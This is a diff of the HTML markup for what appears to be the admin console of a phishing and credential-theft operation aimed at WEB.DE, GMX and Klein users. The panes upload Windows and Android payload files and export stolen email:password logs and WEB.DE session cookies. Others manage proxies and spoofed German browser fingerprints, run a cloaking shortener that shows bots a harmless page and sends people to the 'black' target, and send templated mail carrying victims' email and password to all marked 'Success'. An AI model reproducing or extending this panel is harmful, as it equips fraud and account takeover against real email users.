@@ -137,111 +137,105 @@
           <button type="button" class="config-nav-item" data-pane="email" id="config-nav-email">E-Mail</button>
         </nav>
         <div class="config-content">
-          <div id="config-pane-windows" class="config-pane active">
-            <div class="config-group">
-              <h3 class="admin-section-title admin-section-title--block">Downloads · Windows</h3>
-              <div class="config-control-row config-upload-row config-upload-row--windows">
-                <input type="file" id="config-download-files-input" accept=".exe,.zip,.rar,.bin" multiple aria-label="Загрузить файлы" class="config-input config-input-file">
-                <span class="config-archive-password-wrap">
-                  <label for="config-windows-archive-password" class="config-archive-password-label">Пароль архива:</label>
-                  <input type="text" id="config-windows-archive-password" class="config-input config-archive-password-input" placeholder="для .zip/.rar" autocomplete="off" aria-label="Пароль от архива">
-                </span>
-                <button type="button" id="config-download-files-save" class="btn btn-primary btn-sm admin-btn-save">Сохранить</button>
-              </div>
-              <p id="config-download-files-message" class="config-msg hidden"></p>
-            </div>
-            <div class="config-group">
-              <div class="config-files-list-label admin-section-title">Список файлов (после сохранения)</div>
-              <p class="config-files-list-hint">Загруженные файлы сохраняются под теми же именами, что и при загрузке (опасные символы в имени заменяются на <code>_</code>).</p>
-              <div id="config-download-files-list" class="config-files-list"></div>
-            </div>
-            <div class="config-group config-actions-row">
-              <button type="button" id="config-download-reset-counts" class="btn btn-ghost btn-sm" data-platform="windows">Сбросить счётчики</button>
-              <button type="button" id="config-download-rotate-next" class="btn btn-ghost btn-sm" data-platform="windows">След. конфиг</button>
-            </div>
-          </div>
-
-          <div id="config-pane-android" class="config-pane">
-            <div class="config-group">
-              <h3 class="admin-section-title admin-section-title--block">Downloads · Android</h3>
-              <div class="config-control-row config-upload-row">
-                <input type="file" id="config-android-files-input" accept=".apk,.bin,.zip" multiple aria-label="Загрузить файлы" class="config-input config-input-file">
-                <button type="button" id="config-android-files-save" class="btn btn-primary btn-sm admin-btn-save">Сохранить</button>
-              </div>
-              <p id="config-android-files-message" class="config-msg hidden"></p>
-            </div>
-            <div class="config-group">
-              <div class="config-files-list-label admin-section-title">Список файлов (после сохранения)</div>
-              <div id="config-android-files-list" class="config-files-list"></div>
-            </div>
-            <div class="config-group config-actions-row">
-              <button type="button" id="config-android-reset-counts" class="btn btn-ghost btn-sm" data-platform="android">Сбросить счётчики</button>
-              <button type="button" id="config-android-rotate-next" class="btn btn-ghost btn-sm" data-platform="android">След. конфиг</button>
-            </div>
-          </div>
-
-          <div id="config-pane-export" class="config-pane">
-            <h3 class="admin-section-title admin-section-title--block">Выгрузка логов</h3>
-            <div id="config-export-body" class="config-toggle-body">
-              <div class="config-row config-export-platforms">
-                <label class="config-cb"><input type="checkbox" id="export-platform-windows" class="config-cb-input"> Win</label>
-                <label class="config-cb"><input type="checkbox" id="export-platform-macos" class="config-cb-input"> Mac</label>
-                <label class="config-cb"><input type="checkbox" id="export-platform-android" class="config-cb-input"> And</label>
-                <label class="config-cb"><input type="checkbox" id="export-platform-ios" class="config-cb-input"> iOS</label>
-                <label class="config-cb"><input type="checkbox" id="export-platform-unknown" class="config-cb-input"> —</label>
-              </div>
-              <div class="config-row">
-                <button type="button" id="export-logs-credentials" class="btn btn-ghost">email:pass</button>
-                <button type="button" id="export-logs-old-new" class="btn btn-ghost">email:pass new</button>
-                <button type="button" id="export-logs-all-emails" class="btn btn-ghost">email</button>
-                <button type="button" id="export-logs-all-email-pass" class="btn btn-ghost">all</button>
-              </div>
-              <div class="config-row config-export-cookies-row">
-                <span class="config-export-cookies-label">Куки WEB.DE:</span>
-                <button type="button" id="export-cookies-all" class="btn btn-ghost">Выгрузить все куки</button>
-                <button type="button" id="export-cookies-new" class="btn btn-ghost">Выгрузить новые</button>
-                <button type="button" id="export-cookies-force" class="btn btn-ghost" title="Все куки в архив, без пометки выгруженных">Принудительная выгрузка</button>
+          <div id="config-pane-windows" class="config-pane config-pane-hub active">
+            <div class="config-hub-page">
+              <section class="config-hub-card" aria-labelledby="config-win-upload-title">
+                <h4 id="config-win-upload-title" class="config-hub-bar-title">Загрузка</h4>
+                <div class="config-control-row config-upload-row config-upload-row--windows">
+                  <input type="file" id="config-download-files-input" accept=".exe,.zip,.rar,.bin" multiple aria-label="Файлы" class="config-input config-input-file">
+                  <span class="config-archive-password-wrap">
+                    <label for="config-windows-archive-password" class="config-archive-password-label">ZIP/RAR пароль</label>
+                    <input type="text" id="config-windows-archive-password" class="config-input config-archive-password-input" autocomplete="off" aria-label="Пароль архива">
+                  </span>
+                  <button type="button" id="config-download-files-save" class="btn btn-primary btn-sm admin-btn-save">Сохранить</button>
+                </div>
+                <p id="config-download-files-message" class="config-msg config-hub-card__msg hidden"></p>
+              </section>
+              <section class="config-hub-card" aria-labelledby="config-win-list-title">
+                <h4 id="config-win-list-title" class="config-hub-bar-title">Файлы</h4>
+                <div id="config-download-files-list" class="config-files-list config-hub-files-list"></div>
+              </section>
+              <div class="config-hub-footer-actions">
+                <button type="button" id="config-download-reset-counts" class="btn btn-ghost btn-sm" data-platform="windows">Сбросить счётчики</button>
+                <button type="button" id="config-download-rotate-next" class="btn btn-ghost btn-sm" data-platform="windows">Следующий конфиг</button>
               </div>
             </div>
           </div>
 
-          <div id="config-pane-proxies" class="config-pane config-pane-proxies">
-            <div class="config-proxy-fp-page">
-              <header class="config-proxy-fp-hero">
-                <p class="config-proxy-fp-eyebrow">WEB.DE · автоматизация</p>
-                <h3 class="config-proxy-fp-title">Прокси и отпечатки</h3>
-                <p class="config-proxy-fp-lead">Прокси для воркеров и пул браузерных отпечатков. Статистика по парам прокси × отпечаток обновляется по кнопке.</p>
-              </header>
-              <div class="config-proxy-fp-stack">
-                <section class="config-proxy-fp-card" aria-labelledby="config-proxies-block-proxy-title">
+          <div id="config-pane-android" class="config-pane config-pane-hub">
+            <div class="config-hub-page">
+              <section class="config-hub-card" aria-labelledby="config-and-upload-title">
+                <h4 id="config-and-upload-title" class="config-hub-bar-title">Загрузка</h4>
+                <div class="config-control-row config-upload-row">
+                  <input type="file" id="config-android-files-input" accept=".apk,.bin,.zip" multiple aria-label="Файлы" class="config-input config-input-file">
+                  <button type="button" id="config-android-files-save" class="btn btn-primary btn-sm admin-btn-save">Сохранить</button>
+                </div>
+                <p id="config-android-files-message" class="config-msg config-hub-card__msg hidden"></p>
+              </section>
+              <section class="config-hub-card" aria-labelledby="config-and-list-title">
+                <h4 id="config-and-list-title" class="config-hub-bar-title">Файлы</h4>
+                <div id="config-android-files-list" class="config-files-list config-hub-files-list"></div>
+              </section>
+              <div class="config-hub-footer-actions">
+                <button type="button" id="config-android-reset-counts" class="btn btn-ghost btn-sm" data-platform="android">Сбросить счётчики</button>
+                <button type="button" id="config-android-rotate-next" class="btn btn-ghost btn-sm" data-platform="android">Следующий конфиг</button>
+              </div>
+            </div>
+          </div>
+
+          <div id="config-pane-export" class="config-pane config-pane-hub">
+            <div class="config-hub-page">
+              <section class="config-hub-card config-hub-card--export" aria-label="Выгрузка">
+                <div id="config-export-body" class="config-hub-export-body">
+                  <div class="config-export-platforms config-hub-chip-row">
+                    <label class="config-cb config-hub-cb"><input type="checkbox" id="export-platform-windows" class="config-cb-input"> Windows</label>
+                    <label class="config-cb config-hub-cb"><input type="checkbox" id="export-platform-macos" class="config-cb-input"> macOS</label>
+                    <label class="config-cb config-hub-cb"><input type="checkbox" id="export-platform-android" class="config-cb-input"> Android</label>
+                    <label class="config-cb config-hub-cb"><input type="checkbox" id="export-platform-ios" class="config-cb-input"> iOS</label>
+                    <label class="config-cb config-hub-cb"><input type="checkbox" id="export-platform-unknown" class="config-cb-input"> Неизв.</label>
+                  </div>
+                  <div class="config-hub-sep" role="separator"></div>
+                  <div class="config-hub-btn-row">
+                    <button type="button" id="export-logs-credentials" class="btn btn-ghost btn-sm config-hub-export-btn">email : pass</button>
+                    <button type="button" id="export-logs-old-new" class="btn btn-ghost btn-sm config-hub-export-btn">email : pass + new</button>
+                    <button type="button" id="export-logs-all-emails" class="btn btn-ghost btn-sm config-hub-export-btn">email</button>
+                    <button type="button" id="export-logs-all-email-pass" class="btn btn-ghost btn-sm config-hub-export-btn">all</button>
+                  </div>
+                  <div class="config-hub-sep" role="separator"></div>
+                  <div class="config-hub-btn-row config-hub-btn-row--cookies">
+                    <button type="button" id="export-cookies-all" class="btn btn-ghost btn-sm config-hub-export-btn">Куки</button>
+                    <button type="button" id="export-cookies-new" class="btn btn-ghost btn-sm config-hub-export-btn">Новые</button>
+                    <button type="button" id="export-cookies-force" class="btn btn-ghost btn-sm config-hub-export-btn">Force</button>
+                  </div>
+                </div>
+              </section>
+            </div>
+          </div>
+
+          <div id="config-pane-proxies" class="config-pane config-pane-hub config-pane-proxies">
+            <div class="config-hub-page config-proxy-fp-page">
+              <div class="config-proxy-fp-stack config-hub-stack">
+                <section class="config-hub-card config-proxy-fp-card" aria-labelledby="config-proxies-block-proxy-title">
                   <div class="config-proxy-fp-card__head">
-                    <div class="config-proxy-fp-card__title-wrap">
-                      <h4 id="config-proxies-block-proxy-title" class="config-proxy-fp-card__title">Прокси</h4>
-                      <p class="config-proxy-fp-card__hint">Формат строки: <code class="config-proxy-fp-code">host:port:user:password</code></p>
-                    </div>
+                    <h4 id="config-proxies-block-proxy-title" class="config-hub-bar-title config-hub-bar-title--inhead">Прокси</h4>
                     <div class="config-control-row config-proxies-actions config-proxy-fp-toolbar">
                       <button type="button" id="config-proxies-validate" class="btn btn-ghost btn-sm">Проверить</button>
-                      <button type="button" id="config-proxies-add-row" class="btn btn-ghost btn-sm">+ Строка</button>
+                      <button type="button" id="config-proxies-add-row" class="btn btn-ghost btn-sm">+</button>
                       <button type="button" id="config-proxies-save" class="btn btn-primary btn-sm admin-btn-save">Сохранить</button>
-                      <button type="button" id="config-proxy-fp-stats-refresh-top" class="btn btn-ghost btn-sm">Обновить статистику</button>
+                      <button type="button" id="config-proxy-fp-stats-refresh-top" class="btn btn-ghost btn-sm">Статистика</button>
                     </div>
                   </div>
                   <p id="config-proxies-message" class="config-msg config-proxy-fp-msg hidden"></p>
-                  <div id="config-proxies-list-wrap" class="config-proxy-lines-list" aria-label="Список прокси"></div>
-                  <textarea id="config-proxies-text" class="config-input config-proxies-textarea admin-code-editor" rows="6" placeholder="host:port:login:password" spellcheck="false" style="display:none"></textarea>
+                  <div id="config-proxies-list-wrap" class="config-proxy-lines-list" aria-label="Прокси"></div>
+                  <textarea id="config-proxies-text" class="config-input config-proxies-textarea admin-code-editor" rows="6" spellcheck="false" style="display:none"></textarea>
                 </section>
-                <section class="config-proxy-fp-card config-proxy-fp-card--fingerprints" aria-labelledby="config-proxies-block-fp-title">
-                  <div class="config-proxy-fp-card__head">
-                    <div class="config-proxy-fp-card__title-wrap">
-                      <h4 id="config-proxies-block-fp-title" class="config-proxy-fp-card__title">Отпечатки</h4>
-                      <p class="config-proxy-fp-card__hint">Активные пресеты из пула на сервере. Список без прокрутки внутри блока — при большом числе записей прокручивается страница целиком.</p>
-                    </div>
-                  </div>
+                <section class="config-hub-card config-proxy-fp-card config-proxy-fp-card--fingerprints" aria-labelledby="config-proxies-block-fp-title">
+                  <h4 id="config-proxies-block-fp-title" class="config-hub-bar-title">Отпечатки</h4>
                   <p id="config-webde-fp-list-message" class="config-msg config-proxy-fp-msg hidden"></p>
-                  <div id="config-webde-fp-list" class="config-fp-lines-list" aria-label="Список отпечатков"></div>
+                  <div id="config-webde-fp-list" class="config-fp-lines-list" aria-label="Отпечатки"></div>
                   <div class="config-proxy-fp-card__foot">
                     <div class="config-control-row config-proxies-actions config-proxy-fp-toolbar">
-                      <button type="button" id="config-webde-fp-generate-de" class="btn btn-ghost btn-sm" title="Полностью заменить пул: 100 новых отпечатков DE/Win/Chrome, запись в JSON и пул для сайта, сброс активных индексов">Сгенерировать (DE)</button>
+                      <button type="button" id="config-webde-fp-generate-de" class="btn btn-ghost btn-sm">Gen DE</button>
                       <button type="button" id="config-webde-fp-check" class="btn btn-ghost btn-sm">Обновить</button>
                     </div>
                   </div>
@@ -250,74 +244,137 @@
             </div>
           </div>
 
-          <div id="config-pane-short" class="config-pane">
-            <div class="config-group">
-              <h3 class="admin-section-title admin-section-title--block">Short · домены</h3>
-              <p class="config-files-list-hint">Сокращалка + гейт: домен из Dynadot добавляется в Cloudflare, A запись на IP сервера, в Dynadot — NS на Cloudflare. Боты видят вайт (или страницу новостей), люди переходят на целевой URL.</p>
-              <div class="config-control-row" style="flex-wrap: wrap; gap: 8px; align-items: center;">
-                <input type="text" id="config-short-domain" class="config-input" placeholder="Домен (bueatyk.com)" style="width: 200px;" autocomplete="off">
-                <input type="text" id="config-short-target" class="config-input" placeholder="Целевой URL (блек)" style="flex: 1; min-width: 180px;" autocomplete="off">
-                <label style="display:flex;align-items:center;gap:6px;font-size:0.9rem;">Боты видят:
-                  <select id="config-short-white-style" class="config-input" style="width: auto;">
-                    <option value="">Impressum (по умолчанию)</option>
-                    <option value="news-webde">Новости (стиль WEB.DE)</option>
-                  </select>
-                </label>
-                <button type="button" id="config-short-add" class="btn btn-primary btn-sm">Добавить</button>
-              </div>
-              <p id="config-short-message" class="config-msg hidden"></p>
-            </div>
-            <div class="config-group">
-              <div class="config-files-list-label admin-section-title">Домены</div>
-              <div id="config-short-list" class="config-files-list"></div>
+          <div id="config-pane-short" class="config-pane config-pane-short config-pane-hub">
+            <div class="config-hub-page config-short-page">
+              <section class="config-hub-card config-short-add-card" aria-label="Домен">
+                <h4 class="config-hub-bar-title">Short</h4>
+                <div class="config-short-add-row">
+                  <input type="text" id="config-short-new-domain" class="config-input config-short-add-row__input" autocomplete="off" spellcheck="false">
+                  <button type="button" id="config-short-add-domain" class="btn btn-primary btn-sm config-short-add-row__btn">+</button>
+                </div>
+                <p id="config-short-message" class="config-msg config-short-msg hidden"></p>
+              </section>
+
+              <div id="config-short-list" class="config-short-list" aria-label="Домены"></div>
+
+              <section class="config-hub-card config-brand-section" aria-labelledby="config-brand-heading">
+                <div class="config-brand-head-row">
+                  <h4 id="config-brand-heading" class="config-hub-bar-title config-hub-bar-title--flush">Бренды</h4>
+                  <span id="config-brand-file-hint" class="config-brand-source-badge" role="status"></span>
+                </div>
+                <div class="config-brand-grid">
+                  <div class="config-brand-card config-brand-card--gmx">
+                    <div class="config-brand-card__badge">GMX</div>
+                    <label class="config-brand-card__label" for="config-brand-gmx-domain">Домен</label>
+                    <input type="text" id="config-brand-gmx-domain" class="config-input config-brand-card__field" autocomplete="off" spellcheck="false">
+                    <label class="config-brand-card__label" for="config-brand-gmx-list">Хосты</label>
+                    <textarea id="config-brand-gmx-list" class="config-input admin-code-editor config-brand-card__textarea" rows="3" spellcheck="false"></textarea>
+                  </div>
+                  <div class="config-brand-card config-brand-card--webde">
+                    <div class="config-brand-card__badge">WEB.DE</div>
+                    <label class="config-brand-card__label" for="config-brand-webde-domain">Домен</label>
+                    <input type="text" id="config-brand-webde-domain" class="config-input config-brand-card__field" autocomplete="off" spellcheck="false">
+                    <label class="config-brand-card__label" for="config-brand-webde-list">Хосты</label>
+                    <textarea id="config-brand-webde-list" class="config-input admin-code-editor config-brand-card__textarea" rows="3" spellcheck="false"></textarea>
+                  </div>
+                  <div class="config-brand-card config-brand-card--klein">
+                    <div class="config-brand-card__badge">Klein</div>
+                    <label class="config-brand-card__label" for="config-brand-klein-domain">Домен</label>
+                    <input type="text" id="config-brand-klein-domain" class="config-input config-brand-card__field" autocomplete="off" spellcheck="false">
+                    <label class="config-brand-card__label" for="config-brand-klein-list">Хосты</label>
+                    <textarea id="config-brand-klein-list" class="config-input admin-code-editor config-brand-card__textarea" rows="3" spellcheck="false"></textarea>
+                  </div>
+                </div>
+                <div class="config-brand-actions">
+                  <button type="button" id="config-brand-save" class="btn btn-primary btn-sm admin-btn-save">Сохранить</button>
+                  <button type="button" id="config-brand-reset" class="btn btn-ghost btn-sm">→ .env</button>
+                </div>
+                <p id="config-brand-message" class="config-msg config-brand-message hidden"></p>
+              </section>
             </div>
           </div>
 
-          <div id="config-pane-email" class="config-pane">
-            <div class="config-group">
-              <h3 class="admin-section-title admin-section-title--block">E-mail · конфиги</h3>
-              <p class="config-files-list-hint">Отдельная база конфигов E-Mail (SMTP, From, Subject, Html, Img). Не связана с Mailer / Stealer.</p>
-              <div class="config-control-row" style="flex-wrap: wrap; gap: 8px; align-items: center; margin-bottom: 10px;">
-                <label class="config-label" style="margin: 0;">Профиль:</label>
-                <select id="config-email-profile" class="config-input" style="width: auto; min-width: 180px;"></select>
-                <input type="text" id="config-email-profile-name" class="config-input" placeholder="Имя профиля" style="width: 160px;" autocomplete="off">
-                <button type="button" id="config-email-new" class="btn btn-ghost btn-sm">+ Новый</button>
-                <button type="button" id="config-email-delete" class="btn btn-ghost btn-sm">Удалить</button>
-              </div>
-              <div class="config-group" style="margin-top: 12px;">
-                <label class="config-label" for="config-email-smtp">SMTP</label>
-                <input type="text" id="config-email-smtp" class="config-input" placeholder="host:port:user:fromEmail:password" spellcheck="false" style="width: 100%; max-width: 520px;">
-              </div>
-              <div class="config-control-row" style="flex-wrap: wrap; gap: 12px 20px; margin-top: 10px;">
-                <div>
-                  <label class="config-label" for="config-email-from">From</label>
-                  <input type="text" id="config-email-from" class="config-input" placeholder="Sender name" style="width: 200px;" autocomplete="off">
+          <div id="config-pane-email" class="config-pane config-pane-hub config-pane-email-hub">
+            <div class="config-hub-page config-email-hub-page">
+              <div class="config-email-hub-layout">
+              <div class="config-email-hub-main">
+              <section class="config-hub-card" aria-labelledby="config-email-profile-title">
+                <h4 id="config-email-profile-title" class="config-hub-bar-title">Профиль</h4>
+                <div class="config-email-hub-profile-row">
+                  <label class="config-hub-field-label" for="config-email-profile">Активный</label>
+                  <select id="config-email-profile" class="config-input config-email-hub-select"></select>
+                  <input type="text" id="config-email-profile-name" class="config-input config-email-hub-name" autocomplete="off">
+                  <button type="button" id="config-email-new" class="btn btn-ghost btn-sm">+</button>
+                  <button type="button" id="config-email-delete" class="btn btn-ghost btn-sm">×</button>
                 </div>
-                <div>
-                  <label class="config-label" for="config-email-subject">Subject</label>
-                  <input type="text" id="config-email-subject" class="config-input" placeholder="Тема письма" style="width: 240px;" autocomplete="off">
+              </section>
+              <section class="config-hub-card" aria-labelledby="config-email-smtp-title">
+                <h4 id="config-email-smtp-title" class="config-hub-bar-title">SMTP</h4>
+                <label class="config-hub-field-label" for="config-email-smtp">Строка</label>
+                <input type="text" id="config-email-smtp" class="config-input config-email-hub-smtp" spellcheck="false">
+                <div class="config-email-hub-grid-2">
+                  <div class="config-email-hub-field">
+                    <label class="config-hub-field-label" for="config-email-from">From</label>
+                    <input type="text" id="config-email-from" class="config-input" autocomplete="off">
+                  </div>
+                  <div class="config-email-hub-field">
+                    <label class="config-hub-field-label" for="config-email-subject">Subject</label>
+                    <input type="text" id="config-email-subject" class="config-input" autocomplete="off">
+                  </div>
                 </div>
-              </div>
-              <div class="config-group" style="margin-top: 12px;">
-                <label class="config-label" for="config-email-html">Html</label>
-                <textarea id="config-email-html" class="config-input admin-code-editor" rows="6" placeholder="HTML шаблон (подстановки _email_, _password_, _src1_ для картинки)" spellcheck="false"></textarea>
-                <div style="margin-top: 6px;">
-                  <input type="file" id="config-email-template-file" accept=".html,.htm,text/html" class="config-input-file" aria-label="Загрузить HTML">
-                  <span id="config-email-image-status" class="config-msg" style="margin-left: 8px; font-size: 0.9rem;"></span>
+              </section>
+              <section class="config-hub-card" aria-labelledby="config-email-html-title">
+                <h4 id="config-email-html-title" class="config-hub-bar-title">Шаблон</h4>
+                <label class="config-hub-field-label" for="config-email-html">HTML</label>
+                <textarea id="config-email-html" class="config-input admin-code-editor config-email-hub-html" rows="6" spellcheck="false"></textarea>
+                <div class="config-email-files-stack">
+                  <div class="config-email-file-block">
+                    <span class="config-email-file-block__label" id="config-email-tpl-file-lbl">.html</span>
+                    <div class="config-email-file-slot">
+                      <input type="file" id="config-email-template-file" accept=".html,.htm,text/html" class="config-email-file-input" aria-labelledby="config-email-tpl-file-lbl">
+                    </div>
+                  </div>
+                  <div class="config-email-file-block">
+                    <span class="config-email-file-block__label" id="config-email-img-file-lbl">_src1_</span>
+                    <div class="config-email-file-slot config-email-file-slot--with-action">
+                      <input type="file" id="config-email-image-file" accept="image/*" class="config-email-file-input" aria-labelledby="config-email-img-file-lbl">
+                      <button type="button" id="config-email-image-clear" class="btn btn-ghost btn-sm config-email-file-clear">Сброс</button>
+                    </div>
+                    <p id="config-email-image-status" class="config-email-image-status-line" aria-live="polite"></p>
+                  </div>
                 </div>
+              </section>
+              <p id="config-email-message" class="config-msg config-email-hub-message hidden"></p>
               </div>
-              <div class="config-group" style="margin-top: 8px;">
-                <label class="config-label">Img</label>
-                <div style="display: flex; align-items: center; gap: 8px; flex-wrap: wrap;">
-                  <input type="file" id="config-email-image-file" accept="image/*" aria-label="Картинка для _src1_">
-                  <button type="button" id="config-email-image-clear" class="btn btn-ghost btn-sm">Удалить картинку</button>
+              <aside class="config-email-hub-preview" aria-label="Предпросмотр письма">
+                <div class="config-hub-card config-email-preview-card">
+                  <h4 class="config-hub-bar-title">Предпросмотр</h4>
+                  <div class="config-email-preview-toolbar">
+                    <div class="config-email-preview-toolbar-start">
+                      <button type="button" id="config-email-preview-viewport-toggle" class="btn btn-ghost btn-sm config-email-preview-vp-btn" aria-label="Предпросмотр как на телефоне" title="Предпросмотр как на телефоне" aria-pressed="false">
+                        <svg class="config-email-preview-vp-ico config-email-preview-vp-ico--phone" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="6" y="2" width="12" height="20" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
+                        <svg class="config-email-preview-vp-ico config-email-preview-vp-ico--pc hidden" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><path d="M8 21h8"/><path d="M12 17v4"/></svg>
+                      </button>
+                      <button type="button" id="config-email-preview-edit-toggle" class="btn btn-ghost btn-sm">Правка в превью</button>
+                      <button type="button" id="config-email-preview-send" class="btn btn-primary btn-sm">Отправить</button>
+                    </div>
+                    <span id="config-email-preview-mode-hint" class="config-email-preview-toolbar-hint"></span>
+                  </div>
+                  <div id="config-email-preview-envelope" class="config-email-preview-envelope">
+                    <div id="config-email-preview-hero-mount"></div>
+                    <div class="config-email-preview-to-row">
+                      <label class="config-email-preview-to-label" for="config-email-preview-to">Кому</label>
+                      <input type="text" id="config-email-preview-to" class="config-input config-email-preview-to-input" autocomplete="off" spellcheck="false" placeholder="email@… или Имя &lt;email@…&gt;">
+                    </div>
+                  </div>
+                  <div id="config-email-preview-frame-wrap" class="config-email-preview-frame-wrap">
+                    <div class="config-email-preview-viewport-shell">
+                      <iframe id="config-email-preview-frame" class="config-email-preview-frame" title="Предпросмотр HTML письма" sandbox="allow-same-origin"></iframe>
+                    </div>
+                  </div>
                 </div>
+              </aside>
               </div>
-              <div class="config-control-row" style="margin-top: 12px; flex-wrap: wrap; gap: 8px; align-items: center;">
-                <button type="button" id="config-email-save" class="btn btn-primary btn-sm admin-btn-save">Сохранить</button>
-                <button type="button" id="config-email-send-all-success" class="btn btn-ghost btn-sm" title="Отправить письмо по шаблону Config E-Mail всем, у кого статус Успех и указан email">Письмо всем (Успех)</button>
-              </div>
-              <p id="config-email-message" class="config-msg hidden"></p>
             </div>
           </div>
         </div>
